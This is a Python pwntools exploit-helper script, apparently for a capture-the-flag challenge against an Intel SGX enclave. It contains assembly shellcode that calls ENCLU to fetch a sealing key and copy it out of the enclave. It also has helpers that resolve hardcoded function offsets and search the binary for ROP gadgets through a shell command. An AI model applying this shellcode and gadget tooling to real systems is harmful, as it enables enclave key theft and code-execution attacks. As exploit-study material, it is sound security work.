from pwn import *
from enum import Enum
from subprocess import Popen, PIPE

context.arch = "amd64"
shellcode = """
    rep movsb

    mov rcx, rdx
    mov al, 1
    enclu

    movdqa xmm0, [rdx]
    movdqu [r9], xmm0

    mov rdi, r9
    mov rbx, r8
    mov al, 4
    enclu
"""


class Helper:

    def __init__(self, binary_path: str, base: int = 0):
        self._base = base
        self._binary_path = binary_path

    def find(self, param: str):
        """ interface """
        ...

    def set_base(self, new_base: int):
        """ interface """
        ...


class FuncHelper(Helper):

    def __init__(self, *args, **kwargs):
        super(FuncHelper, self).__init__(*args, **kwargs)

    def find(self, func_name: str) -> int:
        binary = ELF(self._binary_path, checksec=False)
        if func_name in binary.sym:
            return binary.sym[func_name]
        return -1


class AppFuncHelper(FuncHelper):

    def __init__(self, *args, **kwargs):
        super(AppFuncHelper, self).__init__(*args, **kwargs)
        self._main = 0
        self._puts = 0

    @property
    def main(self) -> int:
        if self._main:
            return self._main
        offset = self.find("main")
        if offset == -1:
            offset = 0x4287
        self._main = self._base + offset
        return self._main

    @property
    def puts(self) -> int:
        if self._puts:
            return self._puts

        offset = self.find("puts")
        if offset == -1:
            offset = 0x2240
        self._puts = self._base + offset
        return self._puts

    def set_base(self, new_base: int):
        assert isinstance(new_base, int)
        if self._main > 0:
            self._main = self._main - self._base + new_base
        if self._puts > 0:
            self._puts = self._puts - self._base + new_base
        self._base = new_base


class EnclaveFuncHelper(FuncHelper):
    do_output_ret_off = 0x21ED

    def __init__(self, *args, **kwargs):
        super(EnclaveFuncHelper, self).__init__(*args, **kwargs)
        self._cont = 0
        self._asm_oret = 0

    @property
    def asm_oret(self) -> int:
        if self._asm_oret:
            return self._asm_oret
        offset = self.find("asm_oret")
        if offset == -1:
            offset = 0x93426
        self._asm_oret = self._base + offset + 0x3B
        return self._asm_oret

    @property
    def continue_execution(self) -> int:
        if self._cont:
            return self._cont
        offset = self.find("continue_execution")
        if offset == -1:
            offset = 0x93540
        self._cont = self._base + offset
        return self._cont

    def set_base(self, new_base: int):
        assert isinstance(new_base, int)
        if self._cont > 0:
            self._cont = self._cont - self._base + new_base
        if self._asm_oret > 0:
            self._asm_oret = self._asm_oret - self._base + new_base
        self._base = new_base


class GadgetType(Enum):

    POP_RDI = ": pop rdi ; ret"
    WRITE_MEM_4 = "mov dword ptr \[rcx\], eax ;"


class GadgetHelper(Helper):

    def __init__(self, *args, **kwargs):
        super(GadgetHelper, self).__init__(*args, **kwargs)
        self._pop_rdi = 0
        self._write_mem_4 = 0

    @property
    def pop_rdi(self) -> int:
        if self._pop_rdi:
            return self._pop_rdi
        address = self.find(GadgetType.POP_RDI)
        if address != -1:
            self._pop_rdi = self._base + address
            return self._pop_rdi
        return address

    @property
    def write_mem_4(self) -> int:
        if self._write_mem_4:
            return self._write_mem_4
        address = self.find(GadgetType.WRITE_MEM_4)
        if address != -1:
            self._write_mem_4 = self._base + address
            return self._write_mem_4
        return address

    def _do_find(self, only: str, grep: str) -> int:
        cmd_line = f"ROPgadget --binary {self._binary_path} --only '{only}' | grep '{grep}'"
        with Popen(cmd_line, stdout=PIPE, shell=True) as process:
            output = process.stdout.read()
            if isinstance(output, bytes):
                output = output.decode("utf-8", errors="ignore")
            try:
                address = int(output.split(" : ", 1)[0], 16)
            except:
                address = -1
        return address

    def _do_mov_find(self, grep: str) -> int:
        return self._do_find("mov|ret", grep)

    def _do_pop_find(self, grep: str) -> int:
        return self._do_find("pop|ret", grep)

    def find(self, g_type: GadgetType) -> int:
        address = -1
        if g_type == GadgetType.POP_RDI:
            address = self._do_pop_find(g_type.value)
        elif g_type == GadgetType.WRITE_MEM_4:
            address = self._do_mov_find(g_type.value)
        return address
